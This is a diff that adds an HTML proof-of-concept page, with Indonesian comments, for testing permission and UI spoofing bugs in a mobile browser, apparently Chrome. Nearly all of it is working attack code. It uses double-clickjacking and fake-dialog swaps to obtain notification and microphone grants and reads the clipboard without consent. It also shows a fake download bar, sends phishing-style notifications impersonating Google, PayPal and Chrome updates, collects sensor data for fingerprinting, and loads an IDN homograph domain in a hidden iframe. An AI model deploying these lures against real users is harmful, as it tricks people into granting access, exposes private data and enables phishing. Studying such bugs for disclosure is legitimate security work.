@@ -1,0 +1,657 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>Permission & UI Security Bypass PoC</title>
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: -apple-system, Roboto, Arial; background:#fff; padding:12px; }
+.btn {
+  display:block; width:100%; margin:5px 0; padding:13px;
+  font-size:14px; border:none; border-radius:8px;
+  background:#9c27b0; color:#fff; cursor:pointer; text-align:left;
+}
+.btn:active { opacity:0.8; }
+.btn small { display:block; color:rgba(255,255,255,0.7); margin-top:3px; font-size:11px; }
+#log {
+  margin-top:10px; padding:8px; background:#fafafa;
+  font-family:monospace; font-size:11px;
+  max-height:280px; overflow-y:auto; border-radius:8px;
+}
+</style>
+</head>
+<body>
+
+<h3>🔥 Bug 3: Permission & UI Security Bypass</h3>
+<p style="font-size:11px;color:#666;margin:4px 0 10px;">
+  Ref: CVE-2026-3925 (LookalikeChecks), CVE-2026-8564 (Downloads UI), 
+  CVE-2026-5905 (Permission spoof)
+</p>
+
+<button class="btn" onclick="testDoubleClickjack()">
+  🎯 Test 1: Double Clickjacking → Permission Grant
+  <small>2 clicks = grant notification tanpa sadar</small>
+</button>
+
+<button class="btn" onclick="testTimingPermission()">
+  ⏱️ Test 2: Tap Timing Attack
+  <small>Fake button → real permission dialog swap</small>
+</button>
+
+<button class="btn" onclick="testClipboardSteal()">
+  📋 Test 3: Clipboard Read tanpa permission
+  <small>execCommand + async clipboard API race</small>
+</button>
+
+<button class="btn" onclick="testDownloadSpoof()">
+  📥 Test 4: Download UI Spoofing
+  <small>CVE-2026-8564 style — fake download dialog</small>
+</button>
+
+<button class="btn" onclick="testNotifPayload()">
+  🔔 Test 5: Notification Content Injection
+  <small>Rich notification with misleading content</small>
+</button>
+
+<button class="btn" onclick="testPermissionPersist()">
+  🔓 Test 6: Permission Persistence Check
+  <small>iframe dari origin berbeda — permission diwarisi?</small>
+</button>
+
+<button class="btn" onclick="testSensorSilent()">
+  📡 Test 7: Silent Sensor Access
+  <small>Accelerometer/Gyroscope tanpa permission dialog</small>
+</button>
+
+<button class="btn" onclick="testLookalikeBypass()">
+  👀 Test 8: Lookalike Domain Warning Bypass
+  <small>CVE-2026-3925 — hide/overlay safety warning</small>
+</button>
+
+<div id="log"></div>
+
+<script>
+function log(msg) {
+  document.getElementById('log').innerHTML +=
+    new Date().toISOString().substr(11,8) + ' ' + msg + '<br>';
+  document.getElementById('log').scrollTop = 99999;
+}
+
+// ============================================================
+// TEST 1: Double Clickjacking
+// Klik 1: user bermaksud klik tombol innocent
+// Klik 2: tombol berubah jadi permission "Allow"
+// Ref: Double Clickjacking 2024 technique
+// ============================================================
+function testDoubleClickjack() {
+  log('=== Test 1: Double Clickjacking ===');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family: Arial; background:#f5f5f5; }
+.game-container {
+  max-width:400px; margin:20px auto; padding:20px;
+  background:#fff; border-radius:16px; box-shadow:0 2px 8px rgba(0,0,0,0.1);
+}
+.prize-btn {
+  width:100%; padding:16px; font-size:18px;
+  border:none; border-radius:12px; cursor:pointer;
+  background:#4CAF50; color:white; margin:8px 0;
+  transition: all 0.1s;
+}
+.prize-btn:active { transform:scale(0.98); }
+.counter { text-align:center; font-size:48px; margin:20px 0; }
+.info { font-size:12px; color:#666; text-align:center; }
+.warn { background:#ffebee; padding:10px; border-radius:8px;
+  font-size:11px; color:#c62828; margin-top:20px; }
+</style>
+</head><body>
+<div class="game-container">
+  <h2 style="text-align:center;">🎮 Tap Challenge</h2>
+  <p style="text-align:center;color:#666;margin:8px 0;">
+    Tap "CLAIM" sebanyak 2x secepat mungkin!
+  </p>
+  <div class="counter" id="count">0</div>
+  <button class="prize-btn" id="mainBtn" onclick="handleTap()">
+    🎁 TAP TO CLAIM
+  </button>
+  <p class="info" id="info">Tap 2x untuk claim hadiah</p>
+  
+  <div class="warn" id="result" style="display:none;"></div>
+</div>
+
+<script>
+var tapCount = 0;
+var permissionTriggered = false;
+
+function handleTap() {
+  tapCount++;
+  document.getElementById('count').textContent = tapCount;
+  
+  if (tapCount === 1) {
+    document.getElementById('info').textContent = 'Bagus! Tap sekali lagi...';
+    
+    // Setelah tap pertama, SEGERA trigger permission request
+    // Permission dialog akan muncul TEPAT saat user mau tap kedua
+    setTimeout(function() {
+      if (!permissionTriggered) {
+        permissionTriggered = true;
+        Notification.requestPermission().then(function(result) {
+          var res = document.getElementById('result');
+          res.style.display = 'block';
+          if (result === 'granted') {
+            res.innerHTML = '🔴 <strong>PERMISSION GRANTED!</strong><br><br>' +
+              'User mungkin tidak sengaja tap "Allow" karena mengira sedang tap game button.<br>' +
+              'Ini adalah Double Clickjacking — 2 tap, tap kedua mengenai dialog permission.<br><br>' +
+              '<strong>Jika ini terjadi = BUG VALID (Permission tanpa informed consent)</strong>';
+            
+            new Notification('🎉 Prize Claimed!', {
+              body: 'Notification permission granted via double-clickjacking',
+              icon: 'https://www.google.com/favicon.ico'
+            });
+          } else {
+            res.innerHTML = '✅ Permission ' + result + ' — dialog muncul dan user sadar.<br>' +
+              'Tapi cek: apakah dialog muncul TEPAT di posisi tombol game?<br>' +
+              'Jika ya, timing masih bisa diexploit dengan lebih presisi.';
+          }
+        });
+      }
+    }, 100); // 100ms delay — user masih dalam momentum tap
+  }
+}
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru — tap tombol "CLAIM" 2x cepat');
+  log('Lihat apakah tap kedua mengenai permission dialog');
+}
+
+// ============================================================
+// TEST 2: Fake Button → Real Permission Swap
+// Posisikan fake button TEPAT di posisi permission "Allow"
+// ============================================================
+function testTimingPermission() {
+  log('=== Test 2: Timing attack ===');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:Arial; background:#fff; }
+.overlay {
+  position:fixed; top:0; left:0; width:100%; height:100%;
+  background:rgba(0,0,0,0.5); z-index:9998;
+}
+.dialog {
+  position:fixed; bottom:0; left:0; width:100%;
+  background:#fff; border-radius:16px 16px 0 0;
+  padding:20px; z-index:9999;
+  box-shadow:0 -4px 20px rgba(0,0,0,0.15);
+}
+.dialog h3 { margin-bottom:8px; }
+.dialog p { color:#666; font-size:14px; margin-bottom:16px; }
+.btn-row { display:flex; gap:8px; }
+.btn-allow {
+  flex:1; padding:14px; border:none; border-radius:24px;
+  background:#1a73e8; color:white; font-size:16px; cursor:pointer;
+}
+.btn-deny {
+  flex:1; padding:14px; border:1px solid #ddd; border-radius:24px;
+  background:white; color:#333; font-size:16px; cursor:pointer;
+}
+.warn { padding:10px; margin:10px; background:#ffebee; border-radius:8px;
+  font-size:11px; color:#c62828; }
+</style>
+</head><body>
+
+<div style="padding:20px;text-align:center;">
+  <h2>🎵 Music Player</h2>
+  <p style="color:#666;">Tap play untuk mendengarkan lagu</p>
+</div>
+
+<div class="overlay" id="overlay"></div>
+<div class="dialog" id="dialog">
+  <h3>Enable Audio?</h3>
+  <p>Allow music playback for best experience</p>
+  <div class="btn-row">
+    <button class="btn-deny" onclick="dismiss()">Not Now</button>
+    <button class="btn-allow" id="fakeAllow" onclick="triggerReal()">Allow</button>
+  </div>
+</div>
+
+<div class="warn" id="warn" style="display:none;"></div>
+
+<script>
+function dismiss() {
+  document.getElementById('overlay').style.display = 'none';
+  document.getElementById('dialog').style.display = 'none';
+}
+
+function triggerReal() {
+  // Hilangkan fake dialog
+  dismiss();
+  
+  // LANGSUNG trigger real notification permission
+  // Pada Android, dialog muncul dari bawah — posisi mirip fake dialog tadi
+  // User masih dalam "allow mindset"
+  
+  Notification.requestPermission().then(function(r) {
+    var warn = document.getElementById('warn');
+    warn.style.display = 'block';
+    warn.innerHTML = '<strong>Permission result: ' + r + '</strong><br><br>' +
+      'Fake dialog bertanya "Enable Audio?" — user tap "Allow"<br>' +
+      'Langsung muncul real notification permission dialog<br>' +
+      'User sudah dalam mindset "allow" → kemungkinan besar tap Allow lagi<br><br>' +
+      (r === 'granted' ? '🔴 GRANTED! Timing attack berhasil!' :
+       '✅ User sadar — tapi cek apakah dialog positioning overlap');
+  });
+  
+  // Juga coba camera/mic
+  setTimeout(function() {
+    navigator.mediaDevices.getUserMedia({audio: true}).then(function(stream) {
+      document.getElementById('warn').innerHTML += '<br>🔴 MICROPHONE GRANTED!';
+      stream.getTracks().forEach(t => t.stop());
+    }).catch(function(e) {
+      document.getElementById('warn').innerHTML += '<br>Mic: ' + e.message;
+    });
+  }, 500);
+}
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru — fake audio dialog muncul');
+  log('Tap "Allow" dan lihat apa yang terjadi');
+}
+
+// ============================================================
+// TEST 3: Clipboard read tanpa explicit permission
+// ============================================================
+function testClipboardSteal() {
+  log('=== Test 3: Clipboard access ===');
+  
+  // Method 1: execCommand (legacy)
+  try {
+    var ta = document.createElement('textarea');
+    ta.style.cssText = 'position:fixed;top:-9999px;';
+    document.body.appendChild(ta);
+    ta.focus();
+    var ok = document.execCommand('paste');
+    if (ok && ta.value) {
+      log('🔴 execCommand paste: "' + ta.value.substr(0, 50) + '"');
+    } else {
+      log('execCommand paste: empty/blocked');
+    }
+    ta.remove();
+  } catch(e) {
+    log('execCommand error: ' + e.message);
+  }
+  
+  // Method 2: Async clipboard API
+  if (navigator.clipboard) {
+    navigator.clipboard.readText().then(function(text) {
+      log('🔴 clipboard.readText(): "' + text.substr(0, 50) + '"');
+    }).catch(function(e) {
+      log('clipboard.readText blocked: ' + e.message);
+    });
+    
+    navigator.clipboard.read().then(function(items) {
+      log('🔴 clipboard.read(): ' + items.length + ' items');
+    }).catch(function(e) {
+      log('clipboard.read blocked: ' + e.message);
+    });
+  }
+  
+  // Method 3: paste event listener trick
+  document.addEventListener('paste', function(e) {
+    var data = e.clipboardData.getData('text/plain');
+    log('🔴 paste event captured: "' + data.substr(0, 50) + '"');
+  });
+  log('paste listener registered — coba Ctrl+V atau long-press paste');
+  
+  // Method 4: Input field auto-paste
+  var input = document.createElement('input');
+  input.type = 'text';
+  input.placeholder = 'Long-press here and paste';
+  input.style.cssText = 'width:100%;padding:14px;margin:8px 0;font-size:16px;border:1px solid #9c27b0;border-radius:8px;';
+  input.addEventListener('input', function() {
+    log('Input value: "' + this.value.substr(0, 50) + '"');
+  });
+  document.body.appendChild(input);
+}
+
+// ============================================================
+// TEST 4: Download UI Spoofing (CVE-2026-8564)
+// Fake download bar/dialog yang menipu user
+// ============================================================
+function testDownloadSpoof() {
+  log('=== Test 4: Download UI spoof ===');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:Roboto, Arial; background:#f5f5f5; }
+
+.fake-download-bar {
+  position:fixed; bottom:0; left:0; width:100%;
+  background:#323232; padding:12px 16px;
+  display:flex; align-items:center; gap:12px;
+  z-index:99999;
+  animation: slideUp 0.3s ease-out;
+}
+@keyframes slideUp { from { transform:translateY(100%); } }
+.dl-icon { font-size:24px; }
+.dl-info { flex:1; color:white; }
+.dl-name { font-size:14px; font-weight:500; }
+.dl-size { font-size:12px; color:#aaa; }
+.dl-open {
+  padding:8px 20px; border:none; border-radius:4px;
+  background:#8ab4f8; color:#202124; font-size:14px; cursor:pointer;
+}
+.dl-progress {
+  position:absolute; bottom:0; left:0; height:3px;
+  background:#8ab4f8; animation: progress 2s linear forwards;
+}
+@keyframes progress { from { width:0; } to { width:100%; } }
+
+.content { padding:20px; text-align:center; }
+.warn { margin:20px; padding:12px; background:#ffebee; border-radius:8px;
+  font-size:11px; color:#c62828; }
+</style>
+</head><body>
+
+<div class="content">
+  <h2>📄 Document Viewer</h2>
+  <p style="color:#666;">Your document is ready</p>
+</div>
+
+<!-- Fake Chrome download bar -->
+<div class="fake-download-bar" id="fakeDl">
+  <div class="dl-progress"></div>
+  <span class="dl-icon">📄</span>
+  <div class="dl-info">
+    <div class="dl-name">Invoice_2026.pdf</div>
+    <div class="dl-size">2.3 MB — pdf</div>
+  </div>
+  <button class="dl-open" onclick="fakeOpen()">Open</button>
+</div>
+
+<div class="warn" id="warn" style="display:none;"></div>
+
+<script>
+function fakeOpen() {
+  document.getElementById('fakeDl').style.display = 'none';
+  
+  var w = document.getElementById('warn');
+  w.style.display = 'block';
+  w.innerHTML = '<strong>⚠️ INI FAKE DOWNLOAD BAR</strong><br><br>' +
+    'Fake download bar di bawah layar terlihat IDENTIK dengan Chrome download bar asli.<br>' +
+    'User mengira file sudah di-download dan tap "Open".<br><br>' +
+    '"Open" button bisa di-link ke:<br>' +
+    '• Halaman phishing<br>' +
+    '• File APK malicious<br>' +
+    '• javascript: execution<br><br>' +
+    '<strong>Jika tidak bisa dibedakan dari download bar asli = UI Spoof bug (CVE-2026-8564 style)</strong>';
+    
+  // Trigger real download untuk perbandingan
+  setTimeout(function() {
+    var a = document.createElement('a');
+    a.href = 'data:text/plain,test file content';
+    a.download = 'real_download_test.txt';
+    a.click();
+    w.innerHTML += '<br><br>↑ Real download juga di-trigger untuk perbandingan visual.';
+  }, 1000);
+}
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru — lihat fake download bar di bawah');
+  log('Bandingkan dengan download bar Chrome asli');
+}
+
+// ============================================================
+// TEST 5: Notification Content Injection
+// ============================================================
+function testNotifPayload() {
+  log('=== Test 5: Notification injection ===');
+  
+  Notification.requestPermission().then(function(r) {
+    if (r !== 'granted') {
+      log('Permission ' + r + ' — butuh grant dulu');
+      return;
+    }
+    
+    // Notification dengan content misleading
+    var payloads = [
+      { title: '⚠️ Security Alert', body: 'Your Google account was accessed from new device. Tap to verify.', tag: 'security' },
+      { title: '💰 Payment Received', body: 'You received $500.00 from PayPal. Tap to view.', tag: 'payment' },
+      { title: 'Chrome Update Required', body: 'Critical security update available. Tap to install.', tag: 'update' },
+      { title: '📱 ' + navigator.userAgent.match(/Android \d+/)?.[0], body: 'System warning: storage almost full. Tap to free space.', tag: 'system' },
+    ];
+    
+    payloads.forEach(function(p, i) {
+      setTimeout(function() {
+        new Notification(p.title, {
+          body: p.body,
+          tag: p.tag,
+          icon: 'https://www.google.com/favicon.ico',
+          requireInteraction: true
+        });
+        log('Notification sent: ' + p.title);
+      }, i * 2000);
+    });
+    
+    log('4 misleading notifications akan muncul');
+    log('Yang dicari: apakah Chrome membedakan notif web vs system?');
+    log('Jika user tidak bisa bedakan = UI confusion bug');
+  });
+}
+
+// ============================================================
+// TEST 6: Permission inheritance via iframe
+// ============================================================
+function testPermissionPersist() {
+  log('=== Test 6: Permission persistence ===');
+  
+  // Cek permission status untuk berbagai API
+  var apis = ['notifications', 'geolocation', 'camera', 'microphone', 'clipboard-read', 'clipboard-write'];
+  
+  apis.forEach(function(name) {
+    navigator.permissions.query({name: name}).then(function(result) {
+      var icon = result.state === 'granted' ? '🔴' : 
+                 result.state === 'prompt' ? '🟡' : '⚪';
+      log(icon + ' ' + name + ': ' + result.state);
+      
+      // Watch for changes
+      result.onchange = function() {
+        log('🔄 ' + name + ' changed to: ' + this.state);
+      };
+    }).catch(function(e) {
+      log('⚪ ' + name + ': query failed (' + e.message + ')');
+    });
+  });
+  
+  // Test: iframe dari origin yang berbeda — apakah inherit permissions?
+  var f = document.createElement('iframe');
+  f.src = 'https://example.com';
+  f.allow = 'notifications; camera; microphone; geolocation';
+  f.style.cssText = 'width:100%;height:80px;border:2px solid #9c27b0;margin:8px 0;';
+  document.body.appendChild(f);
+  
+  log('iframe example.com dengan allow="..." ditambahkan');
+  log('Cek: apakah iframe bisa akses permission yang di-grant ke parent?');
+}
+
+// ============================================================
+// TEST 7: Silent sensor access
+// ============================================================
+function testSensorSilent() {
+  log('=== Test 7: Sensor access ===');
+  
+  // Accelerometer — biasanya tidak butuh permission dialog!
+  try {
+    var accel = new Accelerometer({frequency: 10});
+    accel.addEventListener('reading', function() {
+      log('🔴 Accelerometer: x=' + accel.x.toFixed(2) + 
+          ' y=' + accel.y.toFixed(2) + ' z=' + accel.z.toFixed(2));
+      accel.stop(); // Stop setelah 1 reading
+    });
+    accel.addEventListener('error', function(e) {
+      log('Accelerometer error: ' + e.error.message);
+    });
+    accel.start();
+  } catch(e) {
+    log('Accelerometer: ' + e.message);
+  }
+  
+  // Gyroscope
+  try {
+    var gyro = new Gyroscope({frequency: 10});
+    gyro.addEventListener('reading', function() {
+      log('🔴 Gyroscope: x=' + gyro.x.toFixed(2) +
+          ' y=' + gyro.y.toFixed(2) + ' z=' + gyro.z.toFixed(2));
+      gyro.stop();
+    });
+    gyro.start();
+  } catch(e) {
+    log('Gyroscope: ' + e.message);
+  }
+  
+  // DeviceMotion — legacy API, sering tanpa permission
+  window.addEventListener('devicemotion', function(e) {
+    if (e.accelerationIncludingGravity) {
+      var a = e.accelerationIncludingGravity;
+      log('🔴 DeviceMotion: x=' + (a.x||0).toFixed(1) + 
+          ' y=' + (a.y||0).toFixed(1) + ' z=' + (a.z||0).toFixed(1));
+    }
+  }, {once: true});
+  
+  // Battery API
+  if (navigator.getBattery) {
+    navigator.getBattery().then(function(b) {
+      log('🔴 Battery: ' + (b.level*100).toFixed(0) + '% charging=' + b.charging);
+    });
+  }
+  
+  // Network info
+  if (navigator.connection) {
+    var c = navigator.connection;
+    log('🔴 Network: type=' + c.effectiveType + ' downlink=' + c.downlink + 'Mbps');
+  }
+  
+  // Device memory
+  if (navigator.deviceMemory) {
+    log('🔴 Device memory: ' + navigator.deviceMemory + 'GB');
+  }
+  
+  log('Semua sensor di atas TIDAK memunculkan permission dialog');
+  log('Jika data sensor terambil tanpa izin = privacy concern');
+}
+
+// ============================================================
+// TEST 8: Lookalike domain warning bypass
+// CVE-2026-3925 — overlay/hide Chrome safety warning
+// ============================================================
+function testLookalikeBypass() {
+  log('=== Test 8: Lookalike warning bypass ===');
+  
+  var w = window.open('', '_blank');
+  if (!w) { log('❌ Popup blocked'); return; }
+  
+  w.document.write(`<!DOCTYPE html>
+<html><head>
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<style>
+* { margin:0; padding:0; box-sizing:border-box; }
+body { font-family:Arial; }
+
+/* Full-page overlay yang menutupi SEMUA — termasuk safety warning */
+.cover-all {
+  position:fixed; top:0; left:0; width:100vw; height:100vh;
+  background:white; z-index:2147483647; /* MAX z-index */
+  overflow-y:auto;
+}
+.page-content {
+  max-width:420px; margin:0 auto; padding:20px;
+}
+.warn { padding:10px; background:#ffebee; border-radius:8px;
+  font-size:11px; color:#c62828; margin-top:20px; }
+</style>
+</head><body>
+
+<div class="cover-all">
+  <div class="page-content">
+    <h2>Overlay Z-Index Test</h2>
+    <p style="margin:10px 0;color:#666;">
+      Halaman ini mencoba menutupi SEMUA UI browser yang muncul,
+      termasuk safety warnings, permission dialogs, dan interstitials.
+    </p>
+    
+    <div style="background:#f5f5f5;padding:12px;border-radius:8px;margin:10px 0;">
+      <strong>z-index: 2147483647 (MAX)</strong><br>
+      <small>Overlay ini menggunakan z-index tertinggi yang mungkin</small>
+    </div>
+    
+    <p style="font-size:13px;">Sekarang coba:</p>
+    <ol style="font-size:13px;padding-left:20px;line-height:1.8;">
+      <li>Navigate ke domain lookalike (goog1e.com, etc)</li>
+      <li>Apakah Chrome warning muncul DI ATAS overlay ini?</li>
+      <li>Atau overlay ini MENUTUPI warning?</li>
+    </ol>
+    
+    <button onclick="triggerWarning()" style="width:100%;padding:14px;
+      margin:12px 0;background:#9c27b0;color:white;border:none;
+      border-radius:8px;font-size:16px;cursor:pointer;">
+      Trigger Safety Test
+    </button>
+    
+    <div class="warn" id="res"></div>
+  </div>
+</div>
+
+<script>
+function triggerWarning() {
+  var res = document.getElementById('res');
+  
+  // Test 1: Apakah interstitial muncul di atas overlay?
+  res.innerHTML = 'Testing overlay vs browser warnings...<br><br>';
+  
+  // Buat iframe yang navigate ke suspicious URL
+  // Chrome seharusnya menampilkan warning
+  var f = document.createElement('iframe');
+  f.style.cssText = 'position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;';
+  f.src = 'https://xn--googl-fsa.com'; // IDN homograph
+  document.body.appendChild(f);
+  
+  res.innerHTML += 'iframe ke IDN homograph dibuat<br>';
+  res.innerHTML += 'Cek: apakah Chrome warning muncul?<br>';
+  res.innerHTML += 'Jika warning TERTUTUP overlay = BUG!<br><br>';
+  res.innerHTML += '<strong>Manual test:</strong><br>';
+  res.innerHTML += 'Buka tab baru dan navigate ke domain ini secara manual:<br>';
+  res.innerHTML += '• xn--googl-fsa.com<br>';
+  res.innerHTML += '• xn--pypal-4ve.com<br>';
+  res.innerHTML += '• g00gle.com<br>';
+  res.innerHTML += 'Apakah Chrome menampilkan lookalike warning?';
+}
+</script>
+</body></html>`);
+  w.document.close();
+  log('✅ Tab baru — test overlay vs browser warnings');
+}
+</script>
+</body>
+</html>
